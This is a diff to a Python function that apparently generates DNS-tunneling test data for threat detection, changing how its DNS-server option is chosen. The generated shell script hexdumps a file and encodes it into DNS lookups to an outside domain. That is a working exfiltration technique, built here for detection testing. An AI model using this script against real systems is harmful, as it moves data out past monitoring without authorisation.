@@ -31,7 +31,7 @@ def find_gcloud_path():
     return "gcloud"  # Fallback to system PATH
 
 
-def generate_dnst_data_exfiltration(domain: str = "ladytisiphone.com", anycast_ip: str = "", dns_server: str = "169.154.169.254") -> str:
+def generate_dnst_data_exfiltration(domain: str = "ladytisiphone.com", anycast_ip: str = "", dns_server: str = None) -> str:
     """
     Generate DNS tunneling (DNST) test data for threat detection.
     Based on the dnst_detector.py approach but integrated for category analysis.
@@ -39,7 +39,7 @@ def generate_dnst_data_exfiltration(domain: str = "ladytisiphone.com", anycast_i
     Args:
         domain (str): Domain to use for DNS tunneling simulation (default: ladytisiphone.com)
         anycast_ip (str): Anycast IP to use for DNS queries (empty for default)
-        dns_server (str): DNS server to use for queries (default: 169.154.169.254, use 'legacy' for no DNS server)
+        dns_server (str): DNS server to use for queries (None: system default, 'default': 169.154.169.254, IP: use that IP)
         
     Returns:
         str: The generated DNST domain used for tunneling (base domain for threat correlation)
@@ -79,10 +79,15 @@ def generate_dnst_data_exfiltration(domain: str = "ladytisiphone.com", anycast_i
         fh = open("domain_add.sh", "w+")
         
         # Construct dig commands based on dns_server parameter
-        if dns_server and dns_server.lower() != 'legacy':
-            dns_option = f' {dns_server}'
-        else:
+        if dns_server is None:
+            # No --dns-server flag: use system default
             dns_option = ''
+        elif dns_server.lower() == 'default':
+            # --dns-server default: use GCP internal DNS
+            dns_option = ' 169.154.169.254'
+        else:
+            # --dns-server IP: use specified IP
+            dns_option = f' {dns_server}'
         
         data = f'if [ ! -e "test_exfiltration.txt" ]; then echo "File does not exists"; else i=0;host -t A ' \
                f'646e735f31302e747874.1.{domain_start}{dns_option}; hexdump -e \'27/1 "%02x" "\\n"\' ' \
